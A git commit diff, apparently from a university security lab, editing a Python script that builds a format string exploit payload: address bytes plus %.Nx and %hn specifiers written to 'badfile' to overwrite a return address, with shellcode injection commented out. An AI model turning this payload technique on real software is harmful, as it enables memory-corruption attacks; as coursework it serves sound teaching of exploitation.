ac0ef86aaae22f55bf02358b3e38833ec16fd98f
Xiang Zheng <xzheng235-c@my.cityu.edu.hk>
2022-03-02 11:12:14 -0500

    update

--- tut7/task5.py
+++ tut7/task5.py
@@ -17,7 +17,7 @@ current_index += len(fmt1)
 print("format specifiers 1 is ", fmt1)
 """
 
-# frame pointer of fmtstr is 0xffffd298
+# specify target_address: frame pointer of fmtstr is 0xffffd298
 target_address = 0xFFFFD298 + 4  # return address
 content[current_index : current_index + 4] = (target_address + 2).to_bytes(
     4, byteorder="little"
@@ -33,12 +33,11 @@ content[current_index : current_index + 4] = (target_address).to_bytes(
 )
 current_index += 4
 
-N = 4
-# specify offset of shellcode
 small_value = 0xCE8C
 large_value = 0xFFFF
 
 # specify first 2 bytes (small)
+N = 4
 num_of_padding_zeros = small_value - 8 * (N - 1) - 4 * 3
 fmt2 = ("%.8x" * (N - 1) + f"%.{num_of_padding_zeros}x" + "%hn").encode()
 content[current_index : current_index + len(fmt2)] = fmt2
@@ -46,16 +45,14 @@ current_index += len(fmt2)
 print("format specifiers 2 is ", fmt2)
 
 # specify second 2 bytes (large)
-fmt3 = (f"%.{large_value - small_value}x" + "%hn").encode()
+fmt3 = (f"%.{large_value - small_value}x" + "%hn" + "\n").encode()
 content[current_index : current_index + len(fmt3)] = fmt3
-current_index += len(fmt3)
+# current_index += len(fmt3)
 print("format specifiers 3 is ", fmt3)
 
 # inject shellcode
 # content[current_index : current_index + len(shellcode)] = shellcode
 # print("offset of shellcode is ", current_index)
 
-# Write the content to badfile
-file = open("badfile", "wb")
-file.write(content)
-file.close()
+with open("badfile", "wb") as f:
+    f.write(content)
